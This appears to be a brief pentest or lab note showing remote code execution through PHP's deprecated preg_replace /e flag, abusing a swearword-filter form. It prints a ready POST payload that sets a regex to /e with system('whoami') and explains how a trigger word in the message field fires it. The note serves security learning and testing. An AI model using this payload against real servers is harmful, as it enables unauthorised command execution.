PHP had an e flag in regular expressions (deprecated in PHP 5.5.0, removed in 7.0.0) that evaluated the replacement in **preg_replace** as PHP code.

# Example:
If we have a php module that uses regex ex **something/i=example**
We could use the **/e** to evaluate **preg_replace()** and execute some PHP code:
Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#code-execution-using-preg_replace

Before: 
```
swearwords[/dick/i]=penis&
```
After: 
```
swearwords[/dick/e]=system('whoami');
```
To invoke the RCE:
Write in the Message the blacklisted word "dick" and it should be replaced with executed command!
```
swearwords[/fuck/e]=system('whoami');&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort
&swearwords[/asshole/i]=bad person&to=yovecio@test.com&subject=Test&message=fuck&_wysihtml5_mode=1
```

1)The "fuck" word will replace fuck wherever in a message with some PHP exec code
2)When I send fuck into message field it will be replaced with execution of my payload.
The step 2 is important cause if we don't call it, no replace will ever get invoke aka no FUN!
